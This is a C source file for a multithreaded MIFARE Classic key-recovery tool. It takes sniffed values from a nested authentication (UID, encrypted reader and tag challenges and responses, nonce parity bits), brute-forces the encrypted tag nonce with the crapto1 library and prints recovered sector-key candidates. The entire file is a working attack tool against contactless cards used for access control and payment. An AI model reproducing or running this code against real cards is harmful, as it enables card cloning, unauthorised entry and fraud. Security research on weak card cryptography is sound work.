#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#define llx PRIx64
#define lli PRIi64

#include "crapto1.h"
#include <stdio.h>
#include<string.h>
#include<pthread.h>
#include<stdlib.h>
#include<unistd.h>

#define THREADS 4       //threads count
#define odd_parity(i) (( (i) ^ (i)>>1 ^ (i)>>2 ^ (i)>>3 ^ (i)>>4 ^ (i)>>5 ^ (i)>>6 ^ (i)>>7 ^ 1) & 0x01)


time_t start, now, alltime;
clock_t ticks; long count;

int checked_cnt[THREADS];

int thcount = THREADS;
pthread_t tid[THREADS];

int fin_flag =0;

//////////////////// define options here

uint32_t uid = 0x0;     // serial number
uint32_t nt_start= 0x0; // initial bruteforce tag challenge
uint32_t nr_enc = 0x0;  // encrypted reader challenge
uint32_t ar_enc = 0x0;  // encrypted reader response
uint32_t at_enc = 0x0;  // encrypted tag response
uint32_t enc_4 =   0x0; // next encrypted command to sector
uint32_t nt_enc = 0x0; // Encrypted tag nonce
int nt_enc_parity[3] = {0,0,0}; // 3 first parity bit of nt_enc, !(wrong parity)=0


////////////////////


// Return 1 if the nonce is invalid else return 0
int valid_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, int * parity) {
        return ((odd_parity((Nt >> 24) & 0xFF) == ((parity[0]) ^ odd_parity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1,16))) & \
        (odd_parity((Nt >> 16) & 0xFF) == ((parity[1]) ^ odd_parity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,8))) & \
        (odd_parity((Nt >> 8) & 0xFF) == ((parity[2]) ^ odd_parity((NtEnc >> 8) & 0xFF) ^ BIT(Ks1,0)))) ? 1 : 0;
}


int brute_thread(int shift)
{
        struct Crypto1State *revstate;

        uint64_t key;     // recovered key candidate
        uint32_t ks1;     // keystream used to encrypt tag nonce
        uint32_t ks2;     // keystream used to encrypt reader response
        uint32_t ks3;     // keystream used to encrypt tag response
        uint32_t ks4;     // keystream used to encrypt next command
        uint32_t nt;      // current tag nonce

        int rolled_bytes =0;


        printf("Thread #%d started\n",shift);
        int i=0;
        checked_cnt[shift] =0;
        for (nt = nt_start+shift; nt < 0x0000ffff; nt+=thcount)
        {
                rolled_bytes =0;
                if(nt_enc){
                        ks1 = nt ^ nt_enc;
                        if (valid_nonce(nt, nt_enc, ks1, nt_enc_parity) == 1){
                                //Invalid Nonce
                                //printf("skipping invalid nonce:%08x\n", nt);
                                continue;
                        }
                }

                ks2 = ar_enc ^ prng_successor(nt, 64);
                ks3 = at_enc ^ prng_successor(nt, 96);
                revstate = lfsr_recovery64(ks2, ks3);

                ks4 = crypto1_word(revstate,0,0);
                rolled_bytes +=4;

                if (ks4 != 0)
                {
                        printf("\n**** Key candidate found ****\n");
                        printf("thread #%d\n",shift);
                        printf("current nt:%08x\n", nt);
                        printf("current ar_enc:%08x\n", ar_enc);
                        printf("current at_enc:%08x\n", at_enc);
                        printf("ks2:%08x\n", ks2);
                        printf("ks3:%08x\n", ks3);
                        printf("ks4:%08x\n", ks4);
                        printf("enc cmd:\t%08x\n", enc_4);
                        if(enc_4){
                        printf("decrypted cmd:\t%08x\n", ks4^enc_4);
                        }
                        for(i=0;i<rolled_bytes;i++)
                        {
                                lfsr_rollback_byte(revstate,0,0);

                        }

                        lfsr_rollback_word(revstate, 0, 0);
                        lfsr_rollback_word(revstate, 0, 0);
                        lfsr_rollback_word(revstate, nr_enc, 1);
                        lfsr_rollback_word(revstate, uid ^ nt, 0);
                        crypto1_get_lfsr(revstate, &key);
                        printf("\nKey candidate: [%012"llx"]\n\n",key);
                        //printf("First 2 bytes is a junk but other 4 possibly real, who knows?\n\n");
                }
                crypto1_destroy(revstate);

                i++;
                {
                        //printf("thread #%d\t%d\n",shift,i);
                        checked_cnt[shift]++;
                }
        }
        fin_flag++;
        printf("***\nthread #%d finished\nfin_flag:\t%d\n", shift, fin_flag);
        return NULL;

}


int main (int argc, char *argv[]) {
printf("Mifare classic nested auth key recovery. Phase 1.\n");

  if (argc < 5) {
    printf(" syntax: %s <uid> <{nr}> <{ar}> <{at}> [<{next command}> <{nt}> <ntparity1> <ntparity2> <ntparity3>]\n\n",argv[0]);
    printf("   {} = encrypted, ntparity1 : 0 if ! (parity mistmatch), 1 otherwise\n");
    return 1;
  }

sscanf(argv[1],"%x",&uid);
sscanf(argv[2],"%x",&nr_enc);
sscanf(argv[3],"%x",&ar_enc);
sscanf(argv[4],"%x",&at_enc);
if (argc > 5) {
sscanf(argv[5],"%x",&enc_4);
}
if (argc > 6) {
sscanf(argv[6],"%x",&nt_enc);
}
if (argc > 9) {
sscanf(argv[7],"%d",&nt_enc_parity[0]);
sscanf(argv[8],"%d",&nt_enc_parity[1]);
sscanf(argv[9],"%d",&nt_enc_parity[2]);
}


printf("UID:\t\t%08x\n", uid);
printf("Rdr nonce:\t%08x\n", nr_enc);
printf("Rdr answer:\t%08x\n", ar_enc);
printf("Tag answer:\t%08x\n", at_enc);
if (enc_4)
{
        printf("Next cmd:\t%08x\n", enc_4);
}
else
{
        printf("Next cmd not defined\n");
}
if (nt_enc){
        printf("Tag encrypted nonce:\t%08x\n", nt_enc);
}
if (argc > 9){
        printf("Parity bit of nt_enc : %d %d %d", nt_enc_parity[0], nt_enc_parity[1], nt_enc_parity[2]);
}

printf("\nNow let's try to bruteforce encrypted tag nonce last bytes\n\n");





int i = 0;
int err;

while(i < thcount)
{
        err = pthread_create(&(tid[i]), NULL, &brute_thread, i);
        if (err != 0)
                printf("\ncan't create thread :[%s]", strerror(err));
        else
                //printf("Thread #%d created\n",i);
        i++;
}

int total=0;

while(1)
{
        sleep(10);
        //printf("stats by threads:\n");
        total =0;
        for(i=0; i<thcount;i++ )
        {
                //printf("#%d:\t%d\n",i,checked_cnt[i]);
                total+=checked_cnt[i];
        }
        printf("Checked %0.2f %% \t%d\r",(float)total*0.001525902, total);
        fflush(stdout);
        if (fin_flag == thcount){ return 0;}
}
printf("game over.\n");


  return 0;
}
